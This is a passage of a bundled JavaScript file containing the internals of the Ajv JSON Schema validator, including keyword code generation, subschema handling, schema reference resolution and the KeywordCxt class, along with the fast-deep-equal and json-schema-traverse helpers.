        const validateErrs = (0, codegen_1._)`${validateRef}.errors`;
        gen.assign(validateErrs, null);
        assignValid(codegen_1.nil);
        return validateErrs;
      }
      function assignValid(_await = def.async ? (0, codegen_1._)`await ` : codegen_1.nil) {
        const passCxt = it.opts.passContext ? names_1.default.this : names_1.default.self;
        const passSchema = !("compile" in def && !$data || def.schema === false);
        gen.assign(valid5, (0, codegen_1._)`${_await}${(0, code_1.callValidateCode)(cxt, validateRef, passCxt, passSchema)}`, def.modifying);
      }
      function reportErrs(errors) {
        var _a2;
        gen.if((0, codegen_1.not)((_a2 = def.valid) !== null && _a2 !== void 0 ? _a2 : valid5), errors);
      }
    }
    exports2.funcKeywordCode = funcKeywordCode;
    function modifyData(cxt) {
      const { gen, data, it } = cxt;
      gen.if(it.parentData, () => gen.assign(data, (0, codegen_1._)`${it.parentData}[${it.parentDataProperty}]`));
    }
    function addErrs(cxt, errs) {
      const { gen } = cxt;
      gen.if((0, codegen_1._)`Array.isArray(${errs})`, () => {
        gen.assign(names_1.default.vErrors, (0, codegen_1._)`${names_1.default.vErrors} === null ? ${errs} : ${names_1.default.vErrors}.concat(${errs})`).assign(names_1.default.errors, (0, codegen_1._)`${names_1.default.vErrors}.length`);
        (0, errors_1.extendErrors)(cxt);
      }, () => cxt.error());
    }
    function checkAsyncKeyword({ schemaEnv }, def) {
      if (def.async && !schemaEnv.$async)
        throw new Error("async keyword in sync schema");
    }
    function useKeyword(gen, keyword, result) {
      if (result === void 0)
        throw new Error(`keyword "${keyword}" failed to compile`);
      return gen.scopeValue("keyword", typeof result == "function" ? { ref: result } : { ref: result, code: (0, codegen_1.stringify)(result) });
    }
    function validSchemaType(schema, schemaType, allowUndefined = false) {
      return !schemaType.length || schemaType.some((st) => st === "array" ? Array.isArray(schema) : st === "object" ? schema && typeof schema == "object" && !Array.isArray(schema) : typeof schema == st || allowUndefined && typeof schema == "undefined");
    }
    exports2.validSchemaType = validSchemaType;
    function validateKeywordUsage({ schema, opts, self, errSchemaPath }, def, keyword) {
      if (Array.isArray(def.keyword) ? !def.keyword.includes(keyword) : def.keyword !== keyword) {
        throw new Error("ajv implementation error");
      }
      const deps = def.dependencies;
      if (deps === null || deps === void 0 ? void 0 : deps.some((kwd) => !Object.prototype.hasOwnProperty.call(schema, kwd))) {
        throw new Error(`parent schema must have dependencies of ${keyword}: ${deps.join(",")}`);
      }
      if (def.validateSchema) {
        const valid5 = def.validateSchema(schema[keyword]);
        if (!valid5) {
          const msg = `keyword "${keyword}" value is invalid at path "${errSchemaPath}": ` + self.errorsText(def.validateSchema.errors);
          if (opts.validateSchema === "log")
            self.logger.error(msg);
          else
            throw new Error(msg);
        }
      }
    }
    exports2.validateKeywordUsage = validateKeywordUsage;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/compile/validate/subschema.js
var require_subschema = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/compile/validate/subschema.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    exports2.extendSubschemaMode = exports2.extendSubschemaData = exports2.getSubschema = void 0;
    var codegen_1 = require_codegen();
    var util_1 = require_util();
    function getSubschema(it, { keyword, schemaProp, schema, schemaPath, errSchemaPath, topSchemaRef }) {
      if (keyword !== void 0 && schema !== void 0) {
        throw new Error('both "keyword" and "schema" passed, only one allowed');
      }
      if (keyword !== void 0) {
        const sch = it.schema[keyword];
        return schemaProp === void 0 ? {
          schema: sch,
          schemaPath: (0, codegen_1._)`${it.schemaPath}${(0, codegen_1.getProperty)(keyword)}`,
          errSchemaPath: `${it.errSchemaPath}/${keyword}`
        } : {
          schema: sch[schemaProp],
          schemaPath: (0, codegen_1._)`${it.schemaPath}${(0, codegen_1.getProperty)(keyword)}${(0, codegen_1.getProperty)(schemaProp)}`,
          errSchemaPath: `${it.errSchemaPath}/${keyword}/${(0, util_1.escapeFragment)(schemaProp)}`
        };
      }
      if (schema !== void 0) {
        if (schemaPath === void 0 || errSchemaPath === void 0 || topSchemaRef === void 0) {
          throw new Error('"schemaPath", "errSchemaPath" and "topSchemaRef" are required with "schema"');
        }
        return {
          schema,
          schemaPath,
          topSchemaRef,
          errSchemaPath
        };
      }
      throw new Error('either "keyword" or "schema" must be passed');
    }
    exports2.getSubschema = getSubschema;
    function extendSubschemaData(subschema, it, { dataProp, dataPropType: dpType, data, dataTypes, propertyName }) {
      if (data !== void 0 && dataProp !== void 0) {
        throw new Error('both "data" and "dataProp" passed, only one allowed');
      }
      const { gen } = it;
      if (dataProp !== void 0) {
        const { errorPath, dataPathArr, opts } = it;
        const nextData = gen.let("data", (0, codegen_1._)`${it.data}${(0, codegen_1.getProperty)(dataProp)}`, true);
        dataContextProps(nextData);
        subschema.errorPath = (0, codegen_1.str)`${errorPath}${(0, util_1.getErrorPath)(dataProp, dpType, opts.jsPropertySyntax)}`;
        subschema.parentDataProperty = (0, codegen_1._)`${dataProp}`;
        subschema.dataPathArr = [...dataPathArr, subschema.parentDataProperty];
      }
      if (data !== void 0) {
        const nextData = data instanceof codegen_1.Name ? data : gen.let("data", data, true);
        dataContextProps(nextData);
        if (propertyName !== void 0)
          subschema.propertyName = propertyName;
      }
      if (dataTypes)
        subschema.dataTypes = dataTypes;
      function dataContextProps(_nextData) {
        subschema.data = _nextData;
        subschema.dataLevel = it.dataLevel + 1;
        subschema.dataTypes = [];
        it.definedProperties = /* @__PURE__ */ new Set();
        subschema.parentData = it.data;
        subschema.dataNames = [...it.dataNames, _nextData];
      }
    }
    exports2.extendSubschemaData = extendSubschemaData;
    function extendSubschemaMode(subschema, { jtdDiscriminator, jtdMetadata, compositeRule, createErrors, allErrors }) {
      if (compositeRule !== void 0)
        subschema.compositeRule = compositeRule;
      if (createErrors !== void 0)
        subschema.createErrors = createErrors;
      if (allErrors !== void 0)
        subschema.allErrors = allErrors;
      subschema.jtdDiscriminator = jtdDiscriminator;
      subschema.jtdMetadata = jtdMetadata;
    }
    exports2.extendSubschemaMode = extendSubschemaMode;
  }
});

// node_modules/.pnpm/fast-deep-equal@3.1.3/node_modules/fast-deep-equal/index.js
var require_fast_deep_equal = __commonJS({
  "node_modules/.pnpm/fast-deep-equal@3.1.3/node_modules/fast-deep-equal/index.js"(exports2, module2) {
    "use strict";
    module2.exports = function equal(a, b) {
      if (a === b) return true;
      if (a && b && typeof a == "object" && typeof b == "object") {
        if (a.constructor !== b.constructor) return false;
        var length, i, keys;
        if (Array.isArray(a)) {
          length = a.length;
          if (length != b.length) return false;
          for (i = length; i-- !== 0; )
            if (!equal(a[i], b[i])) return false;
          return true;
        }
        if (a.constructor === RegExp) return a.source === b.source && a.flags === b.flags;
        if (a.valueOf !== Object.prototype.valueOf) return a.valueOf() === b.valueOf();
        if (a.toString !== Object.prototype.toString) return a.toString() === b.toString();
        keys = Object.keys(a);
        length = keys.length;
        if (length !== Object.keys(b).length) return false;
        for (i = length; i-- !== 0; )
          if (!Object.prototype.hasOwnProperty.call(b, keys[i])) return false;
        for (i = length; i-- !== 0; ) {
          var key = keys[i];
          if (!equal(a[key], b[key])) return false;
        }
        return true;
      }
      return a !== a && b !== b;
    };
  }
});

// node_modules/.pnpm/json-schema-traverse@1.0.0/node_modules/json-schema-traverse/index.js
var require_json_schema_traverse = __commonJS({
  "node_modules/.pnpm/json-schema-traverse@1.0.0/node_modules/json-schema-traverse/index.js"(exports2, module2) {
    "use strict";
    var traverse = module2.exports = function(schema, opts, cb) {
      if (typeof opts == "function") {
        cb = opts;
        opts = {};
      }
      cb = opts.cb || cb;
      var pre = typeof cb == "function" ? cb : cb.pre || function() {
      };
      var post = cb.post || function() {
      };
      _traverse(opts, pre, post, schema, "", schema);
    };
    traverse.keywords = {
      additionalItems: true,
      items: true,
      contains: true,
      additionalProperties: true,
      propertyNames: true,
      not: true,
      if: true,
      then: true,
      else: true
    };
    traverse.arrayKeywords = {
      items: true,
      allOf: true,
      anyOf: true,
      oneOf: true
    };
    traverse.propsKeywords = {
      $defs: true,
      definitions: true,
      properties: true,
      patternProperties: true,
      dependencies: true
    };
    traverse.skipKeywords = {
      default: true,
      enum: true,
      const: true,
      required: true,
      maximum: true,
      minimum: true,
      exclusiveMaximum: true,
      exclusiveMinimum: true,
      multipleOf: true,
      maxLength: true,
      minLength: true,
      pattern: true,
      format: true,
      maxItems: true,
      minItems: true,
      uniqueItems: true,
      maxProperties: true,
      minProperties: true
    };
    function _traverse(opts, pre, post, schema, jsonPtr, rootSchema, parentJsonPtr, parentKeyword, parentSchema, keyIndex) {
      if (schema && typeof schema == "object" && !Array.isArray(schema)) {
        pre(schema, jsonPtr, rootSchema, parentJsonPtr, parentKeyword, parentSchema, keyIndex);
        for (var key in schema) {
          var sch = schema[key];
          if (Array.isArray(sch)) {
            if (key in traverse.arrayKeywords) {
              for (var i = 0; i < sch.length; i++)
                _traverse(opts, pre, post, sch[i], jsonPtr + "/" + key + "/" + i, rootSchema, jsonPtr, key, schema, i);
            }
          } else if (key in traverse.propsKeywords) {
            if (sch && typeof sch == "object") {
              for (var prop in sch)
                _traverse(opts, pre, post, sch[prop], jsonPtr + "/" + key + "/" + escapeJsonPtr(prop), rootSchema, jsonPtr, key, schema, prop);
            }
          } else if (key in traverse.keywords || opts.allKeys && !(key in traverse.skipKeywords)) {
            _traverse(opts, pre, post, sch, jsonPtr + "/" + key, rootSchema, jsonPtr, key, schema);
          }
        }
        post(schema, jsonPtr, rootSchema, parentJsonPtr, parentKeyword, parentSchema, keyIndex);
      }
    }
    function escapeJsonPtr(str) {
      return str.replace(/~/g, "~0").replace(/\//g, "~1");
    }
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/compile/resolve.js
var require_resolve = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/compile/resolve.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    exports2.getSchemaRefs = exports2.resolveUrl = exports2.normalizeId = exports2._getFullPath = exports2.getFullPath = exports2.inlineRef = void 0;
    var util_1 = require_util();
    var equal = require_fast_deep_equal();
    var traverse = require_json_schema_traverse();
    var SIMPLE_INLINED = /* @__PURE__ */ new Set([
      "type",
      "format",
      "pattern",
      "maxLength",
      "minLength",
      "maxProperties",
      "minProperties",
      "maxItems",
      "minItems",
      "maximum",
      "minimum",
      "uniqueItems",
      "multipleOf",
      "required",
      "enum",
      "const"
    ]);
    function inlineRef(schema, limit = true) {
      if (typeof schema == "boolean")
        return true;
      if (limit === true)
        return !hasRef(schema);
      if (!limit)
        return false;
      return countKeys(schema) <= limit;
    }
    exports2.inlineRef = inlineRef;
    var REF_KEYWORDS = /* @__PURE__ */ new Set([
      "$ref",
      "$recursiveRef",
      "$recursiveAnchor",
      "$dynamicRef",
      "$dynamicAnchor"
    ]);
    function hasRef(schema) {
      for (const key in schema) {
        if (REF_KEYWORDS.has(key))
          return true;
        const sch = schema[key];
        if (Array.isArray(sch) && sch.some(hasRef))
          return true;
        if (typeof sch == "object" && hasRef(sch))
          return true;
      }
      return false;
    }
    function countKeys(schema) {
      let count = 0;
      for (const key in schema) {
        if (key === "$ref")
          return Infinity;
        count++;
        if (SIMPLE_INLINED.has(key))
          continue;
        if (typeof schema[key] == "object") {
          (0, util_1.eachItem)(schema[key], (sch) => count += countKeys(sch));
        }
        if (count === Infinity)
          return Infinity;
      }
      return count;
    }
    function getFullPath(resolver, id = "", normalize2) {
      if (normalize2 !== false)
        id = normalizeId(id);
      const p = resolver.parse(id);
      return _getFullPath(resolver, p);
    }
    exports2.getFullPath = getFullPath;
    function _getFullPath(resolver, p) {
      const serialized = resolver.serialize(p);
      return serialized.split("#")[0] + "#";
    }
    exports2._getFullPath = _getFullPath;
    var TRAILING_SLASH_HASH = /#\/?$/;
    function normalizeId(id) {
      return id ? id.replace(TRAILING_SLASH_HASH, "") : "";
    }
    exports2.normalizeId = normalizeId;
    function resolveUrl(resolver, baseId, id) {
      id = normalizeId(id);
      return resolver.resolve(baseId, id);
    }
    exports2.resolveUrl = resolveUrl;
    var ANCHOR = /^[a-z_][-a-z0-9._]*$/i;
    function getSchemaRefs(schema, baseId) {
      if (typeof schema == "boolean")
        return {};
      const { schemaId, uriResolver } = this.opts;
      const schId = normalizeId(schema[schemaId] || baseId);
      const baseIds = { "": schId };
      const pathPrefix = getFullPath(uriResolver, schId, false);
      const localRefs = {};
      const schemaRefs = /* @__PURE__ */ new Set();
      traverse(schema, { allKeys: true }, (sch, jsonPtr, _, parentJsonPtr) => {
        if (parentJsonPtr === void 0)
          return;
        const fullPath = pathPrefix + jsonPtr;
        let innerBaseId = baseIds[parentJsonPtr];
        if (typeof sch[schemaId] == "string")
          innerBaseId = addRef.call(this, sch[schemaId]);
        addAnchor.call(this, sch.$anchor);
        addAnchor.call(this, sch.$dynamicAnchor);
        baseIds[jsonPtr] = innerBaseId;
        function addRef(ref) {
          const _resolve = this.opts.uriResolver.resolve;
          ref = normalizeId(innerBaseId ? _resolve(innerBaseId, ref) : ref);
          if (schemaRefs.has(ref))
            throw ambiguos(ref);
          schemaRefs.add(ref);
          let schOrRef = this.refs[ref];
          if (typeof schOrRef == "string")
            schOrRef = this.refs[schOrRef];
          if (typeof schOrRef == "object") {
            checkAmbiguosRef(sch, schOrRef.schema, ref);
          } else if (ref !== normalizeId(fullPath)) {
            if (ref[0] === "#") {
              checkAmbiguosRef(sch, localRefs[ref], ref);
              localRefs[ref] = sch;
            } else {
              this.refs[ref] = fullPath;
            }
          }
          return ref;
        }
        function addAnchor(anchor) {
          if (typeof anchor == "string") {
            if (!ANCHOR.test(anchor))
              throw new Error(`invalid anchor "${anchor}"`);
            addRef.call(this, `#${anchor}`);
          }
        }
      });
      return localRefs;
      function checkAmbiguosRef(sch1, sch2, ref) {
        if (sch2 !== void 0 && !equal(sch1, sch2))
          throw ambiguos(ref);
      }
      function ambiguos(ref) {
        return new Error(`reference "${ref}" resolves to more than one schema`);
      }
    }
    exports2.getSchemaRefs = getSchemaRefs;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/compile/validate/index.js
var require_validate = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/compile/validate/index.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    exports2.getData = exports2.KeywordCxt = exports2.validateFunctionCode = void 0;
    var boolSchema_1 = require_boolSchema();
    var dataType_1 = require_dataType();
    var applicability_1 = require_applicability();
    var dataType_2 = require_dataType();
    var defaults_1 = require_defaults();
    var keyword_1 = require_keyword();
    var subschema_1 = require_subschema();
    var codegen_1 = require_codegen();
    var names_1 = require_names();
    var resolve_1 = require_resolve();
    var util_1 = require_util();
    var errors_1 = require_errors();
    function validateFunctionCode(it) {
      if (isSchemaObj(it)) {
        checkKeywords(it);
        if (schemaCxtHasRules(it)) {
          topSchemaObjCode(it);
          return;
        }
      }
      validateFunction(it, () => (0, boolSchema_1.topBoolOrEmptySchema)(it));
    }
    exports2.validateFunctionCode = validateFunctionCode;
    function validateFunction({ gen, validateName, schema, schemaEnv, opts }, body) {
      if (opts.code.es5) {
        gen.func(validateName, (0, codegen_1._)`${names_1.default.data}, ${names_1.default.valCxt}`, schemaEnv.$async, () => {
          gen.code((0, codegen_1._)`"use strict"; ${funcSourceUrl(schema, opts)}`);
          destructureValCxtES5(gen, opts);
          gen.code(body);
        });
      } else {
        gen.func(validateName, (0, codegen_1._)`${names_1.default.data}, ${destructureValCxt(opts)}`, schemaEnv.$async, () => gen.code(funcSourceUrl(schema, opts)).code(body));
      }
    }
    function destructureValCxt(opts) {
      return (0, codegen_1._)`{${names_1.default.instancePath}="", ${names_1.default.parentData}, ${names_1.default.parentDataProperty}, ${names_1.default.rootData}=${names_1.default.data}${opts.dynamicRef ? (0, codegen_1._)`, ${names_1.default.dynamicAnchors}={}` : codegen_1.nil}}={}`;
    }
    function destructureValCxtES5(gen, opts) {
      gen.if(names_1.default.valCxt, () => {
        gen.var(names_1.default.instancePath, (0, codegen_1._)`${names_1.default.valCxt}.${names_1.default.instancePath}`);
        gen.var(names_1.default.parentData, (0, codegen_1._)`${names_1.default.valCxt}.${names_1.default.parentData}`);
        gen.var(names_1.default.parentDataProperty, (0, codegen_1._)`${names_1.default.valCxt}.${names_1.default.parentDataProperty}`);
        gen.var(names_1.default.rootData, (0, codegen_1._)`${names_1.default.valCxt}.${names_1.default.rootData}`);
        if (opts.dynamicRef)
          gen.var(names_1.default.dynamicAnchors, (0, codegen_1._)`${names_1.default.valCxt}.${names_1.default.dynamicAnchors}`);
      }, () => {
        gen.var(names_1.default.instancePath, (0, codegen_1._)`""`);
        gen.var(names_1.default.parentData, (0, codegen_1._)`undefined`);
        gen.var(names_1.default.parentDataProperty, (0, codegen_1._)`undefined`);
        gen.var(names_1.default.rootData, names_1.default.data);
        if (opts.dynamicRef)
          gen.var(names_1.default.dynamicAnchors, (0, codegen_1._)`{}`);
      });
    }
    function topSchemaObjCode(it) {
      const { schema, opts, gen } = it;
      validateFunction(it, () => {
        if (opts.$comment && schema.$comment)
          commentKeyword(it);
        checkNoDefault(it);
        gen.let(names_1.default.vErrors, null);
        gen.let(names_1.default.errors, 0);
        if (opts.unevaluated)
          resetEvaluated(it);
        typeAndKeywords(it);
        returnResults(it);
      });
      return;
    }
    function resetEvaluated(it) {
      const { gen, validateName } = it;
      it.evaluated = gen.const("evaluated", (0, codegen_1._)`${validateName}.evaluated`);
      gen.if((0, codegen_1._)`${it.evaluated}.dynamicProps`, () => gen.assign((0, codegen_1._)`${it.evaluated}.props`, (0, codegen_1._)`undefined`));
      gen.if((0, codegen_1._)`${it.evaluated}.dynamicItems`, () => gen.assign((0, codegen_1._)`${it.evaluated}.items`, (0, codegen_1._)`undefined`));
    }
    function funcSourceUrl(schema, opts) {
      const schId = typeof schema == "object" && schema[opts.schemaId];
      return schId && (opts.code.source || opts.code.process) ? (0, codegen_1._)`/*# sourceURL=${schId} */` : codegen_1.nil;
    }
    function subschemaCode(it, valid5) {
      if (isSchemaObj(it)) {
        checkKeywords(it);
        if (schemaCxtHasRules(it)) {
          subSchemaObjCode(it, valid5);
          return;
        }
      }
      (0, boolSchema_1.boolOrEmptySchema)(it, valid5);
    }
    function schemaCxtHasRules({ schema, self }) {
      if (typeof schema == "boolean")
        return !schema;
      for (const key in schema)
        if (self.RULES.all[key])
          return true;
      return false;
    }
    function isSchemaObj(it) {
      return typeof it.schema != "boolean";
    }
    function subSchemaObjCode(it, valid5) {
      const { schema, gen, opts } = it;
      if (opts.$comment && schema.$comment)
        commentKeyword(it);
      updateContext(it);
      checkAsyncSchema(it);
      const errsCount = gen.const("_errs", names_1.default.errors);
      typeAndKeywords(it, errsCount);
      gen.var(valid5, (0, codegen_1._)`${errsCount} === ${names_1.default.errors}`);
    }
    function checkKeywords(it) {
      (0, util_1.checkUnknownRules)(it);
      checkRefsAndKeywords(it);
    }
    function typeAndKeywords(it, errsCount) {
      if (it.opts.jtd)
        return schemaKeywords(it, [], false, errsCount);
      const types = (0, dataType_1.getSchemaTypes)(it.schema);
      const checkedTypes = (0, dataType_1.coerceAndCheckDataType)(it, types);
      schemaKeywords(it, types, !checkedTypes, errsCount);
    }
    function checkRefsAndKeywords(it) {
      const { schema, errSchemaPath, opts, self } = it;
      if (schema.$ref && opts.ignoreKeywordsWithRef && (0, util_1.schemaHasRulesButRef)(schema, self.RULES)) {
        self.logger.warn(`$ref: keywords ignored in schema at path "${errSchemaPath}"`);
      }
    }
    function checkNoDefault(it) {
      const { schema, opts } = it;
      if (schema.default !== void 0 && opts.useDefaults && opts.strictSchema) {
        (0, util_1.checkStrictMode)(it, "default is ignored in the schema root");
      }
    }
    function updateContext(it) {
      const schId = it.schema[it.opts.schemaId];
      if (schId)
        it.baseId = (0, resolve_1.resolveUrl)(it.opts.uriResolver, it.baseId, schId);
    }
    function checkAsyncSchema(it) {
      if (it.schema.$async && !it.schemaEnv.$async)
        throw new Error("async schema in sync schema");
    }
    function commentKeyword({ gen, schemaEnv, schema, errSchemaPath, opts }) {
      const msg = schema.$comment;
      if (opts.$comment === true) {
        gen.code((0, codegen_1._)`${names_1.default.self}.logger.log(${msg})`);
      } else if (typeof opts.$comment == "function") {
        const schemaPath = (0, codegen_1.str)`${errSchemaPath}/$comment`;
        const rootName = gen.scopeValue("root", { ref: schemaEnv.root });
        gen.code((0, codegen_1._)`${names_1.default.self}.opts.$comment(${msg}, ${schemaPath}, ${rootName}.schema)`);
      }
    }
    function returnResults(it) {
      const { gen, schemaEnv, validateName, ValidationError, opts } = it;
      if (schemaEnv.$async) {
        gen.if((0, codegen_1._)`${names_1.default.errors} === 0`, () => gen.return(names_1.default.data), () => gen.throw((0, codegen_1._)`new ${ValidationError}(${names_1.default.vErrors})`));
      } else {
        gen.assign((0, codegen_1._)`${validateName}.errors`, names_1.default.vErrors);
        if (opts.unevaluated)
          assignEvaluated(it);
        gen.return((0, codegen_1._)`${names_1.default.errors} === 0`);
      }
    }
    function assignEvaluated({ gen, evaluated, props, items }) {
      if (props instanceof codegen_1.Name)
        gen.assign((0, codegen_1._)`${evaluated}.props`, props);
      if (items instanceof codegen_1.Name)
        gen.assign((0, codegen_1._)`${evaluated}.items`, items);
    }
    function schemaKeywords(it, types, typeErrors, errsCount) {
      const { gen, schema, data, allErrors, opts, self } = it;
      const { RULES } = self;
      if (schema.$ref && (opts.ignoreKeywordsWithRef || !(0, util_1.schemaHasRulesButRef)(schema, RULES))) {
        gen.block(() => keywordCode(it, "$ref", RULES.all.$ref.definition));
        return;
      }
      if (!opts.jtd)
        checkStrictTypes(it, types);
      gen.block(() => {
        for (const group of RULES.rules)
          groupKeywords(group);
        groupKeywords(RULES.post);
      });
      function groupKeywords(group) {
        if (!(0, applicability_1.shouldUseGroup)(schema, group))
          return;
        if (group.type) {
          gen.if((0, dataType_2.checkDataType)(group.type, data, opts.strictNumbers));
          iterateKeywords(it, group);
          if (types.length === 1 && types[0] === group.type && typeErrors) {
            gen.else();
            (0, dataType_2.reportTypeError)(it);
          }
          gen.endIf();
        } else {
          iterateKeywords(it, group);
        }
        if (!allErrors)
          gen.if((0, codegen_1._)`${names_1.default.errors} === ${errsCount || 0}`);
      }
    }
    function iterateKeywords(it, group) {
      const { gen, schema, opts: { useDefaults } } = it;
      if (useDefaults)
        (0, defaults_1.assignDefaults)(it, group.type);
      gen.block(() => {
        for (const rule of group.rules) {
          if ((0, applicability_1.shouldUseRule)(schema, rule)) {
            keywordCode(it, rule.keyword, rule.definition, group.type);
          }
        }
      });
    }
    function checkStrictTypes(it, types) {
      if (it.schemaEnv.meta || !it.opts.strictTypes)
        return;
      checkContextTypes(it, types);
      if (!it.opts.allowUnionTypes)
        checkMultipleTypes(it, types);
      checkKeywordTypes(it, it.dataTypes);
    }
    function checkContextTypes(it, types) {
      if (!types.length)
        return;
      if (!it.dataTypes.length) {
        it.dataTypes = types;
        return;
      }
      types.forEach((t) => {
        if (!includesType(it.dataTypes, t)) {
          strictTypesError(it, `type "${t}" not allowed by context "${it.dataTypes.join(",")}"`);
        }
      });
      narrowSchemaTypes(it, types);
    }
    function checkMultipleTypes(it, ts) {
      if (ts.length > 1 && !(ts.length === 2 && ts.includes("null"))) {
        strictTypesError(it, "use allowUnionTypes to allow union type keyword");
      }
    }
    function checkKeywordTypes(it, ts) {
      const rules = it.self.RULES.all;
      for (const keyword in rules) {
        const rule = rules[keyword];
        if (typeof rule == "object" && (0, applicability_1.shouldUseRule)(it.schema, rule)) {
          const { type } = rule.definition;
          if (type.length && !type.some((t) => hasApplicableType(ts, t))) {
            strictTypesError(it, `missing type "${type.join(",")}" for keyword "${keyword}"`);
          }
        }
      }
    }
    function hasApplicableType(schTs, kwdT) {
      return schTs.includes(kwdT) || kwdT === "number" && schTs.includes("integer");
    }
    function includesType(ts, t) {
      return ts.includes(t) || t === "integer" && ts.includes("number");
    }
    function narrowSchemaTypes(it, withTypes) {
      const ts = [];
      for (const t of it.dataTypes) {
        if (includesType(withTypes, t))
          ts.push(t);
        else if (withTypes.includes("integer") && t === "number")
          ts.push("integer");
      }
      it.dataTypes = ts;
    }
    function strictTypesError(it, msg) {
      const schemaPath = it.schemaEnv.baseId + it.errSchemaPath;
      msg += ` at "${schemaPath}" (strictTypes)`;
      (0, util_1.checkStrictMode)(it, msg, it.opts.strictTypes);
    }
    var KeywordCxt = class {
      constructor(it, def, keyword) {
        (0, keyword_1.validateKeywordUsage)(it, def, keyword);
        this.gen = it.gen;
        this.allErrors = it.allErrors;
        this.keyword = keyword;
        this.data = it.data;
        this.schema = it.schema[keyword];
        this.$data = def.$data && it.opts.$data && this.schema && this.schema.$data;
        this.schemaValue = (0, util_1.schemaRefOrVal)(it, this.schema, keyword, this.$data);
        this.schemaType = def.schemaType;
        this.parentSchema = it.schema;
        this.params = {};
        this.it = it;
        this.def = def;
        if (this.$data) {
          this.schemaCode = it.gen.const("vSchema", getData(this.$data, it));
        } else {
          this.schemaCode = this.schemaValue;
          if (!(0, keyword_1.validSchemaType)(this.schema, def.schemaType, def.allowUndefined)) {
            throw new Error(`${keyword} value must be ${JSON.stringify(def.schemaType)}`);
          }
        }
        if ("code" in def ? def.trackErrors : def.errors !== false) {
          this.errsCount = it.gen.const("_errs", names_1.default.errors);
        }
      }
      result(condition, successAction, failAction) {
        this.failResult((0, codegen_1.not)(condition), successAction, failAction);
      }
      failResult(condition, successAction, failAction) {
        this.gen.if(condition);
        if (failAction)
          failAction();
        else
          this.error();
        if (successAction) {
          this.gen.else();
          successAction();
          if (this.allErrors)
            this.gen.endIf();
        } else {
          if (this.allErrors)
            this.gen.endIf();
          else
            this.gen.else();
        }
      }
      pass(condition, failAction) {
        this.failResult((0, codegen_1.not)(condition), void 0, failAction);
      }
      fail(condition) {
        if (condition === void 0) {
          this.error();
          if (!this.allErrors)
            this.gen.if(false);
          return;
        }
        this.gen.if(condition);
        this.error();
        if (this.allErrors)
          this.gen.endIf();
        else
          this.gen.else();
      }
      fail$data(condition) {
        if (!this.$data)
          return this.fail(condition);
        const { schemaCode } = this;
        this.fail((0, codegen_1._)`${schemaCode} !== undefined && (${(0, codegen_1.or)(this.invalid$data(), condition)})`);
      }
      error(append, errorParams, errorPaths) {
        if (errorParams) {
          this.setParams(errorParams);
          this._error(append, errorPaths);
          this.setParams({});
          return;
        }
        this._error(append, errorPaths);
      }
      _error(append, errorPaths) {
        ;
        (append ? errors_1.reportExtraError : errors_1.reportError)(this, this.def.error, errorPaths);
      }
      $dataError() {
        (0, errors_1.reportError)(this, this.def.$dataError || errors_1.keyword$DataError);
      }
      reset() {
        if (this.errsCount === void 0)
          throw new Error('add "trackErrors" to keyword definition');
        (0, errors_1.resetErrorsCount)(this.gen, this.errsCount);
      }
      ok(cond) {
        if (!this.allErrors)
          this.gen.if(cond);
      }
      setParams(obj, assign) {
        if (assign)
          Object.assign(this.params, obj);
        else
          this.params = obj;
      }
      block$data(valid5, codeBlock, $dataValid = codegen_1.nil) {
        this.gen.block(() => {
          this.check$data(valid5, $dataValid);
          codeBlock();
        });
      }
      check$data(valid5 = codegen_1.nil, $dataValid = codegen_1.nil) {
        if (!this.$data)
          return;
        const { gen, schemaCode, schemaType, def } = this;
        gen.if((0, codegen_1.or)((0, codegen_1._)`${schemaCode} === undefined`, $dataValid));
        if (valid5 !== codegen_1.nil)
          gen.assign(valid5, true);
        if (schemaType.length || def.validateSchema) {
          gen.elseIf(this.invalid$data());
          this.$dataError();
          if (valid5 !== codegen_1.nil)
            gen.assign(valid5, false);
        }
        gen.else();
      }
      invalid$data() {
        const { gen, schemaCode, schemaType, def, it } = this;
        return (0, codegen_1.or)(wrong$DataType(), invalid$DataSchema());
        function wrong$DataType() {
          if (schemaType.length) {
            if (!(schemaCode instanceof codegen_1.Name))
              throw new Error("ajv implementation error");
            const st = Array.isArray(schemaType) ? schemaType : [schemaType];
            return (0, codegen_1._)`${(0, dataType_2.checkDataTypes)(st, schemaCode, it.opts.strictNumbers, dataType_2.DataType.Wrong)}`;
          }
          return codegen_1.nil;
        }
        function invalid$DataSchema() {
          if (def.validateSchema) {
            const validateSchemaRef = gen.scopeValue("validate$data", { ref: def.validateSchema });
            return (0, codegen_1._)`!${validateSchemaRef}(${schemaCode})`;
          }
          return codegen_1.nil;
        }
      }
      subschema(appl, valid5) {
        const subschema = (0, subschema_1.getSubschema)(this.it, appl);
        (0, subschema_1.extendSubschemaData)(subschema, this.it, appl);
        (0, subschema_1.extendSubschemaMode)(subschema, appl);
        const nextContext = { ...this.it, ...subschema, items: void 0, props: void 0 };
        subschemaCode(nextContext, valid5);
        return nextContext;
      }
      mergeEvaluated(schemaCxt, toName) {
        const { it, gen } = this;
        if (!it.opts.unevaluated)
          return;
        if (it.props !== true && schemaCxt.props !== void 0) {
          it.props = util_1.mergeEvaluated.props(gen, schemaCxt.props, it.props, toName);
        }
        if (it.items !== true && schemaCxt.items !== void 0) {
          it.items = util_1.mergeEvaluated.items(gen, schemaCxt.items, it.items, toName);
        }
      }
      mergeValidEvaluated(schemaCxt, valid5) {
        const { it, gen } = this;
        if (it.opts.unevaluated && (it.props !== true || it.items !== true)) {
          gen.if(valid5, () => this.mergeEvaluated(schemaCxt, codegen_1.Name));
          return true;
        }
      }
    };
    exports2.KeywordCxt = KeywordCxt;
    function keywordCode(it, keyword, def, ruleType) {
      const cxt = new KeywordCxt(it, def, keyword);
      if ("code" in def) {
        def.code(cxt, ruleType);
      } else if (cxt.$data && def.validate) {
        (0, keyword_1.funcKeywordCode)(cxt, def);
      } else if ("macro" in def) {
        (0, keyword_1.macroKeywordCode)(cxt, def);
      } else if (def.compile || def.validate) {
